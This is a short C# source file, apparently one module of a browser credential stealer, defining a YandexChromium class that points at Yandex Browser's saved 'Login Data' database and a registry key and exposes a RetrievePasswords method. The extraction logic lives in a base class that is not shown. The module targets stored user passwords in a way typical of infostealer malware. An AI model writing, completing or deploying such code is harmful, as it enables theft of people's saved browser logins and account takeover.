namespace xoxoxo.Chromium
{
    internal sealed class YandexChromium : ChromiumBase
    {
        public YandexChromium()
        {
            SetValues();
        }

        private void SetValues()
        {
            ActualDataPath = "\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data";
            RegistryPath = "SOFTWARE\\Yandex\\BLBeacon";
        }

        public void RetrievePasswords()
        {
            RetrieveData();
        }
    }
}